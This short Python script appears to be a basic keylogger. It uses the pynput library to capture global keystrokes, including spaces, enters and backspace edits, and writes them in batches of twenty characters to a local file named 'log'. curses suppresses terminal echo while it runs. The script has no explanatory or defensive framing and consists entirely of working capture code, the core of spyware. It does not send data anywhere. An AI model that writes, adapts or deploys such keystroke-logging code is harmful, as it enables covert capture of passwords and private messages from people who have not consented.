from pynput import keyboard
import curses
inputs = []


def on_press(key):
    try:
        inputs.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            inputs.append(' ')
        elif key == keyboard.Key.backspace:
            if len(inputs) > 0:
                inputs.pop()
        elif key == keyboard.Key.enter:
            inputs.append('\n')


def on_release(key):
    if len(inputs) >= 20:
        file = open('./log', 'a')
        while len(inputs) > 0:
            file.write(inputs.pop(0))
        file.close()


if __name__ == '__main__':
    stdscr = curses.initscr()
    curses.noecho()
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except:
        curses.endwin()
